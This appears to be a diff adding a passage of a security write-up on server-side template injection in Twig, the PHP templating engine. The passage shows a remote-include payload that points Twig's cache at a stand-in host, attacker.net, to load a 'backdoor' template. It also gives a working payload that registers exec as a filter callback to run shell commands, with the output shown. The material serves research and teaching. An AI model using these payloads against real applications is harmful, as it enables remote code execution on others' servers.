@@ -1,0 +1,30 @@
+Twig
+Twig is another popular PHP templating language. It has restrictions similar to Smarty's secure mode by default, with a couple of significant additional limitations - it isn't possible to call static methods, and the return values from all functions are cast to strings. This means we can't use functions to obtain object references like we did with Smarty's self::clearConfig(). Unlike Smarty, Twig has documented its self object (_self) so we don't need to bruteforce any variable names.
+
+The _self object doesn't contain any useful methods, but does have an env attribute that refers to a Twig_Environment object, which looks more promising. The setCache method on Twig_Environment can be used to change the location Twig tries to load and execute compiled templates (PHP files) from. An obvious attack is therefore to introduce a Remote File Include vulnerability by setting the cache location to a remote server:
+
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+However, modern versions of PHP disable inclusion of remote files by default via allow_url_include, so this approach isn't much use.
+
+Further code review reveals a call to the dangerous call_user_func function on line 874, in the getFilter method. Provided we control the arguments to this, it can be used to invoke arbitrary PHP functions.
+
+public function getFilter($name)
+{
+        [snip]
+        foreach ($this->filterCallbacks as $callback) {
+        if (false !== $filter = call_user_func($callback, $name)) {
+            return $filter;
+        }
+    }
+    return false;
+}
+
+public function registerUndefinedFilterCallback($callable)
+{
+    $this->filterCallbacks[] = $callable;
+} 
+Executing arbitrary shell commands is thus just a matter of registering exec as a filter callback, then invoking getFilter:
+
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)
